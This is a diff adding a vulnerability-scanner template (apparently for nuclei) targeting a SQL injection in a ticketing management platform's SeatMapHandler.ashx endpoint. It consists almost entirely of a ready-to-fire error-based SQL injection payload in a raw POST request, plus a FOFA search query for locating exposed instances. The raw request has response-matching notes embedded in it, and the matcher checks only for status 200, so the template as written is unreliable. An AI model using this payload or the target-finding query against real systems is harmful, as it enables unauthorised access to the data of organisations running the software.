@@ -1,0 +1,54 @@
+id: poc-oobwxddm3r01pk8v
+info:
+  name: 中城科信票务管理平台-SQL注入-SeatMapHandler
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oobwxddm3r01pk8v'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: oobwxddm3r01pk8v
+    fofa: '"js/System/jquery.ellipsis.min.js" && icon_hash="1632964065"'
+http:
+- raw:
+  - 'POST /SystemManager/Comm/SeatMapHandler.ashx HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    Method=GetZoneInfo&solutionNo=%27+AND+7821+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%287821%3D7821%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--+Vjyh
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    qkzvq1qqpkq
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
